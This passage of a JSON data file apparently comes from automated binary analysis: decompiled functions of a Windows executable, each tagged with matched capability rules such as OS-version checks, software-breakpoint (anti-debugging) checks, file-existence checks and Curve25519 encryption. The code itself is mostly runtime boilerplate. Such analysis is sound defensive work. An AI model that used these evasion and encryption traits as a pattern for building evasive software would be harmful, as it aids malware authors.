(*arg_14h)();\n                    if (0 < iVar5) {\n                        puVar10 = puVar8;\n                    }\n                }\n                if (puVar10 != puVar7) {\n                    puVar8 = puVar7;\n                    uVar4 = arg_10h;\n                    do {\n                        uVar2 = puVar8[puVar10 - puVar7];\n                        (puVar8 + 1)[(puVar10 - puVar7) + -1] = *puVar8;\n                        *puVar8 = uVar2;\n                        uVar4 = uVar4 - 1;\n                        puVar8 = puVar8 + 1;\n                    } while (uVar4 != 0);\n                }\n            }\n            goto code_r0x004dab53;\n        }\n    }\ncode_r0x004da6de:\n    fcn.00403085(var_118h);\n    return;\ncode_r0x004dab1a:\n    if (var_10ch < puVar7) {\n        (&var_7ch)[var_118h] = var_10ch;\n        (&var_f4h)[var_118h] = puVar7;\n        var_118h = var_118h + 1;\n    }\n    puVar7 = var_fch;\n    if (var_fch <= var_104h) {\ncode_r0x004dab53:\n        var_118h = var_118h + -1;\n        if (-1 < var_118h) {\n            var_104h = (&var_7ch)[var_118h];\n            puVar7 = (&var_f4h)[var_118h];\n            goto code_r0x004da712;\n        }\n        goto code_r0x004da6de;\n    }\n    goto code_r0x004da712;\n}\n",
        "token_count": 2178
    },
    "00406028": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.00406028(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.00403c8d();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049a947:\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n        }\n        else {\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049a9ed:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049aa00;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.00401b22(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n    // switch table (8 cases) at 0x49aa2b\n                    switch(uVar3) {\n                    case 0:\n                        cVar1 = fcn.00404f6b();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049a9ed;\n                    case 2:\n                        cVar1 = fcn.00406609();\n                        break;\n                    case 3:\n                        cVar1 = fcn.00402257();\n                        break;\n                    case 4:\n                        goto code_r0x0049a9c7;\n                    case 5:\n                        cVar1 = fcn.004027e3();\n                        break;\n                    case 6:\n                        cVar1 = fcn.0040361b();\n                        break;\n                    case 7:\n                        cVar1 = fcn.00402351(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049a95a;\n                    default:\n                        goto code_r0x0049a947;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049a9ed;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\ncode_r0x0049aa00:\n                cVar1 = fcn.00404a70();\n            } while (cVar1 != '\\0');\n        }\n    }\ncode_r0x0049a95a:\n    return 0xffffffff;\ncode_r0x0049a9c7:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049a9ed;\n}\n",
        "token_count": 962
    },
    "00406311": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t * fcn.00406311(int32_t *param_1, uint param_2, int32_t *param_3, uint *param_4, int32_t param_5, int32_t param_6\n                      , int32_t param_7, int32_t param_8, uint32_t param_9)\n\n{\n    ushort *puVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint ***pppuVar5;\n    uint *puVar6;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_ffffff98;\n    uint ***apppuStack68 [4];\n    uint32_t uStack52;\n    uint32_t uStack48;\n    int32_t *piStack44;\n    uint8_t uStack40;\n    uint ***pppuStack36;\n    uint ***pppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    iVar2 = param_8;\n    pppuStack32 = apppuStack68;\n    uStack24 = 0x41e3a0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    piStack44 = param_1;\n    pppuVar5 = apppuStack68;\n    if (param_8 != 0) {\n        if (param_9 - param_8 < 2) {\n            uStack20 = 1;\n            fcn.00405547(2);\n            pppuVar5 = pppuStack32;\n        }\n        else {\n            puVar6 = &param_4;\n            if (0xf < param_9) {\n                puVar6 = param_4;\n            }\n            puVar1 = puVar6 + param_8;\n            param_8 = param_8 + 2;\n            *puVar1 = 0x203a;\n            *(puVar6 + iVar2 + 2) = 0;\n            pppuVar5 = apppuStack68;\n        }\n    }\n    pppuStack32 = pppuVar5;\n    uStack20 = 1;\n    pppuStack36 = apppuStack68;\n    (**(*param_3 + 8))(pppuStack36, param_2);\n    if (0xf < uStack48) {\n        pppuStack36 = apppuStack68[0];\n    }\n    if (param_9 - param_8 < uStack52) {\n        uStack20 = 2;\n        fcn.00405547(uStack52, in_stack_ffffff98 & 0xffffff00 | uStack40, pppuStack36, uStack52);\n    }\n    else {\n        iVar2 = param_8 + uStack52;\n        puVar6 = &param_4;\n        if (0xf < param_9) {\n            puVar6 = param_4;\n        }\n        iVar4 = param_8 + puVar6;\n        param_8 = iVar2;\n        fcn.004058f3(iVar4, pppuStack36, uStack52);\n        *(puVar6 + iVar2) = 0;\n    }\n    if (0xf < uStack48) {\n        pppuVar5 = apppuStack68[0];\n        if ((0xfff < uStack48 + 1) && (pppuVar5 = apppuStack68[0][-1],  0x1f < apppuStack68[0] + (-4 - pppuVar5))) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            piVar3 = fcn.00403a76();\n            return piVar3;\n        }\n        fcn.00401a32(pppuVar5);\n    }\n    *piStack44 = 0;\n    piStack44[4] = 0;\n    piStack44[5] = 0;\n    *(piStack44 + 4) = CONCAT44(param_9, param_8);\n    *piStack44 = param_4;\n    piStack44[1] = param_5;\n    piStack44[2] = param_6;\n    piStack44[3] = param_7;\n    *in_FS_OFFSET = piStack28;\n    return param_1;\n}\n",
        "token_count": 961
    },
    "00401181": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401181(int32_t arg_8h, int32_t **arg_ch)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    int32_t *piVar8;\n    bool bVar9;\n    \n    if ((((arg_ch == NULL) || (piVar8 = *arg_ch,  piVar8 == NULL)) || (*piVar8 != -0x1f928c9d)) ||\n       ((piVar8[4] != 3 || (((piVar8[5] != 0x19930520 && (piVar8[5] != 0x19930521)) && (piVar8[5] != 0x19930522)))))) {\n        fcn.00404e94();\n        pcVar2 = swi(3);\n        uVar5 = (*pcVar2)();\n        return uVar5;\n    }\n    piVar8 = *(piVar8[7] + 0xc);\n    iVar6 = *piVar8;\n    do {\n        if (iVar6 < 1) {\n            return 0;\n        }\n        piVar8 = piVar8 + 1;\n        puVar7 = arg_8h + 8;\n        puVar3 = *(*piVar8 + 4) + 8;\n        do {\n            uVar1 = *puVar7;\n            bVar9 = uVar1 < *puVar3;\n            if (uVar1 != *puVar3) {\ncode_r0x00483623:\n                uVar4 = -bVar9 | 1;\n                goto code_r0x00483628;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar7[1];\n            bVar9 = uVar1 < puVar3[1];\n            if (uVar1 != puVar3[1]) goto code_r0x00483623;\n            puVar7 = puVar7 + 2;\n            puVar3 = puVar3 + 2;\n        } while (uVar1 != 0);\n        uVar4 = 0;\ncode_r0x00483628:\n        if (uVar4 == 0) {\n            return 1;\n        }\n        iVar6 = iVar6 + -1;\n    } while( true );\n}\n",
        "token_count": 542
    },
    "00403206": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00403206(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    int32_t arg_ch;\n    code *pcVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56ab50, 8);\n    piVar1 = *(unaff_EBP + 8);\n    if ((((piVar1 != NULL) && (*piVar1 == -0x1f928c9d)) && (piVar1[4] == 3)) &&\n       ((((piVar1[5] == 0x19930520 || (piVar1[5] == 0x19930521)) || (piVar1[5] == 0x19930522)) &&\n        (puVar2 = piVar1[7],  puVar2 != NULL)))) {\n        arg_ch = *(puVar2 + 4);\n        if (arg_ch == 0) {\n            if (((*puVar2 & 0x10) != 0) && (piVar1 = *piVar1[6],  piVar1 != NULL)) {\n                pcVar3 = *(*piVar1 + 8);\n                (**0x573000)(piVar1);\n                (*pcVar3)();\n            }\n        }\n        else {\n            *(unaff_EBP + -4) = 0;\n            fcn.00402987(piVar1[6], arg_ch);\n            *(unaff_EBP + -4) = 0xfffffffe;\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return;\n}\n",
        "token_count": 401
    },
    "00404516": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404516(uint *arg_8h)\n\n{\n    char *pcVar1;\n    \n    if ((((**0x56f458 != '\\0') && (**0x56f458 == '_')) && ((*0x56f458)[1] != '\\0')) && ((*0x56f458)[1] == '_')) {\n        pcVar1 = *0x56f458 + 2;\n        *0x56f458 = *0x56f458 + 3;\n        if (3 < *pcVar1 - 0x41U) {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            *(arg_8h + 1) = 2;\n            return;\n        }\n    }\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    return;\n}\n",
        "token_count": 196
    },
    "0040487c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040487c(uint32_t arg_8h)\n\n{\n    if (arg_8h < 4) {\n        return arg_8h * 0xc + 0x54f9fc;\n    }\n    return 0x54fa20;\n}\n",
        "token_count": 65
    },
    "004055a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004055a6(uint8_t *arg_8h, uint8_t **arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t in_EDX;\n    uint32_t extraout_EDX;\n    uint32_t arg_8h_00;\n    uint32_t in_stack_ffffffe0;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    uVar2 = in_EDX & 0xffffff00 | *arg_8h;\n    do {\n        if ((uVar2 != *(iVar4 + 0x5522a8)) && (uVar2 != *(iVar4 + 0x5522ac))) {\n            fcn.004b4bea();\n            return in_stack_ffffffe0;\n        }\n        uVar3 = **arg_ch;\n        uVar2 = uVar2 & 0xffffff00 | uVar3;\n        iVar4 = iVar4 + 1;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar3;\n    } while (iVar4 != 3);\n    fcn.00402dce(uVar2);\n    uVar3 = **arg_ch;\n    *arg_ch = *arg_ch + 1;\n    *arg_8h = uVar3;\n    if (uVar3 == 0x28) {\n        uVar3 = **arg_ch;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar3;\n        cVar1 = fcn.00404d68(arg_8h, arg_ch);\n        if (cVar1 != '\\0') {\n            uVar2 = *arg_8h;\n            fcn.00402dce(uVar2);\n            return uVar2;\n        }\n        cVar1 = fcn.004032a6(arg_8h, arg_ch);\n        uVar2 = *arg_8h;\n        arg_8h_00 = extraout_EDX & 0xffffff00 | uVar2;\n        if (cVar1 != '\\0') {\n            fcn.00402dce(arg_8h_00);\n            return arg_8h_00;\n        }\n        if (*arg_8h != 0x29) {\n            do {\n                uVar3 = uVar2;\n                if (uVar3 == 0) break;\n                if ((((9 < uVar3 - 0x30) && (0x19 < uVar3 + 0x9f)) && (0x19 < uVar3 + 0xbf)) && (uVar3 != 0x5f))\n                goto code_r0x004b41aa;\n                uVar3 = **arg_ch;\n                uVar2 = uVar3;\n                *arg_ch = *arg_ch + 1;\n                *arg_8h = uVar3;\n            } while (uVar3 != 0x29);\n            if (uVar3 != 0x29) goto code_r0x004b41aa;\n        }\n        uVar2 = 4;\n    }\n    else {\ncode_r0x004b41aa:\n        cVar1 = fcn.004b4bea();\n        uVar2 = (-(cVar1 != '\\0') & 0xfffffffd) + 7;\n    }\n    return uVar2;\n}\n",
        "token_count": 775
    },
    "0045e623": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045e623(int32_t **arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t **ppiVar4;\n    uint uVar5;\n    \n    piVar1 = *arg_8h;\n    if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&\n       ((iVar2 = piVar1[5],  iVar2 == 0x19930520 ||\n        (((iVar2 == 0x19930521 || (iVar2 == 0x19930522)) || (iVar2 == 0x1994000)))))) {\n        ppiVar4 = fcn.004021b7();\n        *ppiVar4 = piVar1;\n        piVar1 = arg_8h[1];\n        ppiVar4 = fcn.004061c2();\n        *ppiVar4 = piVar1;\n        fcn.0040106e();\n        pcVar3 = swi(3);\n        uVar5 = (*pcVar3)();\n        return uVar5;\n    }\n    return 0;\n}\n",
        "token_count": 264
    },
    "004037ce": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045e8e0)\n// WARNING: Removing unreachable block (ram,0x0045e8a5)\n// WARNING: Removing unreachable block (ram,0x0045e957)\n\nuint fcn.004037ce(void)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t in_XCR0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x56ec4c = 0;\n    *0x56cc9c = *0x56cc9c | 1;\n    iVar3 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(10);\n    uVar4 = *0x56cc9c;\n    if (iVar3 != 0) {\n        piVar1 = cpuid_basic_info(0);\n        puVar2 = cpuid_Version_info(1);\n        uVar5 = puVar2[3];\n        if (((piVar1[1] ^ 0x756e6547U | piVar1[3] ^ 0x6c65746eU | piVar1[2] ^ 0x49656e69U) == 0) &&\n           (((((uVar4 = *puVar2 & 0xfff3ff0,  uVar4 == 0x106c0 || (uVar4 == 0x20660)) || (uVar4 == 0x20670)) ||\n             ((uVar4 == 0x30650 || (uVar4 == 0x30660)))) || (uVar4 == 0x30670)))) {\n            *0x56ec50 = *0x56ec50 | 1;\n        }\n        if (*piVar1 < 7) {\n            uVar6 = 0;\n        }\n        else {\n            iVar3 = cpuid_Extended_Feature_Enumeration_info(7);\n            uVar6 = *(iVar3 + 4);\n            if ((uVar6 & 0x200) != 0) {\n                *0x56ec50 = *0x56ec50 | 2;\n            }\n        }\n        *0x56ec4c = 1;\n        uVar4 = *0x56cc9c | 2;\n        if ((uVar5 & 0x100000) != 0) {\n            uVar4 = *0x56cc9c | 6;\n            *0x56ec4c = 2;\n            if ((((uVar5 & 0x8000000) != 0) && ((uVar5 & 0x10000000) != 0)) && ((in_XCR0 & 6) == 6)) {\n                *0x56ec4c = 3;\n                uVar4 = *0x56cc9c | 0xe;\n                if ((uVar6 & 0x20) != 0) {\n                    *0x56ec4c = 5;\n                    uVar4 = *0x56cc9c | 0x2e;\n                    if (((uVar6 & 0xd0030000) == 0xd0030000) && ((in_XCR0 & 0xe0) == 0xe0)) {\n                        *0x56cc9c = *0x56cc9c | 0x6e;\n                        *0x56ec4c = 6;\n                        uVar4 = *0x56cc9c;\n                    }\n                }\n            }\n        }\n    }\n    *0x56cc9c = uVar4;\n    return 0;\n}\n",
        "token_count": 870
    },
    "00401073": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00401073(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    piVar1 = *0x56f39c;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405240();\n    iVar3 = fcn.0040212b(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00405aa6(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004057f9();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040238d(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x573000)();\n        (*pcVar2)();\n        *0x56f39c = piVar1;\n    }\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 420
    },
    "004011ae": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004011ae(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_8h = param_1[10];\n    arg_8h_00 = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.00403cc9(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x55055c;\n            param_1[0xd] = 0x55055c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403e18(arg_8h_00, arg_8h);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 347
    },
    "004013e3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.004013e3(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    cVar1 = fcn.00404cc8(param_1 + 0xd);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00405128();\n        if (cVar1 != '\\0') {\n            arg_ch = param_1[10];\n            if (arg_ch == -1) {\n                arg_ch = 0x7fffffff;\n            }\n            arg_8h = param_1[0xd];\n            cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == NULL) {\n                    arg_8h = \"(null)\";\n                    param_1[0xd] = \"(null)\";\n                }\n                uVar2 = fcn.00403f3f(arg_8h, arg_ch);\n            }\n            else {\n                if (arg_8h == NULL) {\n                    arg_8h = 0x55055c;\n                    param_1[0xd] = 0x55055c;\n                }\n                *(param_1 + 0xf) = 1;\n                uVar2 = fcn.00403e18(arg_8h, arg_ch);\n            }\n            param_1[0xe] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 366
    },
    "00401870": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401870(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_8h = param_1[10];\n    arg_8h_00 = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.00405191(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x55055c;\n            param_1[0xd] = 0x55055c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403e18(arg_8h_00, arg_8h);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 346
    },
    "004019e7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004019e7(int32_t *param_1)\n\n{\n    uint32_t in_EAX;\n    \n    if (*param_1 != 0) {\n        in_EAX = fcn.00401edd();\n        if (in_EAX != 0xffffffff) {\n            *(param_1 + 5) = in_EAX;\n            goto code_r0x00465e23;\n        }\n    }\n    *param_1 = 0;\n    in_EAX = in_EAX & 0xffffff00 | *(param_1 + 5);\ncode_r0x00465e23:\n    *(param_1 + 1) = 1;\n    return in_EAX;\n}\n",
        "token_count": 155
    },
    "00401c5d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401c5d(int32_t *param_1)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    \n    if (*param_1 != 0) {\n        iVar2 = fcn.00401654();\n        if (iVar2 != -1) {\n            uVar1 = 0;\n            goto code_r0x004657f8;\n        }\n    }\n    *param_1 = 0;\n    uVar1 = 1;\ncode_r0x004657f8:\n    *(param_1 + 1) = uVar1;\n    return;\n}\n",
        "token_count": 134
    },
    "00401ee7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ee7(uint *arg_8h, uint32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *in_ECX;\n    \n    if (arg_ch < 10) {\n        if ((*in_ECX != -1) && (arg_ch <= *in_ECX)) {\n            puVar1 = in_ECX[arg_ch + 1];\n            *arg_8h = *puVar1;\n            arg_8h[1] = puVar1[1];\n            return;\n        }\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n    }\n    else {\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 3;\n    }\n    *arg_8h = 0;\n    return;\n}\n",
        "token_count": 192
    },
    "004020d1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.004020d1(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    cVar1 = fcn.004045d9(param_1 + 0xd);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00406528();\n        if (cVar1 != '\\0') {\n            arg_ch = param_1[10];\n            if (arg_ch == -1) {\n                arg_ch = 0x7fffffff;\n            }\n            arg_8h = param_1[0xd];\n            cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == NULL) {\n                    arg_8h = \"(null)\";\n                    param_1[0xd] = \"(null)\";\n                }\n                uVar2 = fcn.00403f3f(arg_8h, arg_ch);\n            }\n            else {\n                if (arg_8h == NULL) {\n                    arg_8h = 0x55055c;\n                    param_1[0xd] = 0x55055c;\n                }\n                *(param_1 + 0xf) = 1;\n                uVar2 = fcn.00403e18(arg_8h, arg_ch);\n            }\n            param_1[0xe] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 366
    },
    "004020f4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004020f4(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_ch = param_1[10];\n    arg_8h = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.00403f3f(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x55055c;\n            param_1[0xd] = 0x55055c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403e18(arg_8h, arg_ch);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 334
    },
    "0040218a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040218a(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    if (*0x56ccd0 == -1) {\n        return 0;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    uVar2 = fcn.004040fc(*0x56ccd0);\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n    return -(uVar2 != 0xffffffff) & uVar2;\n}\n",
        "token_count": 116
    },
    "00402248": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402248(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_8h = param_1[10];\n    arg_8h_00 = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.0040488b(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x55055c;\n            param_1[0xd] = 0x55055c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403e18(arg_8h_00, arg_8h);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 347
    },
    "004024b9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
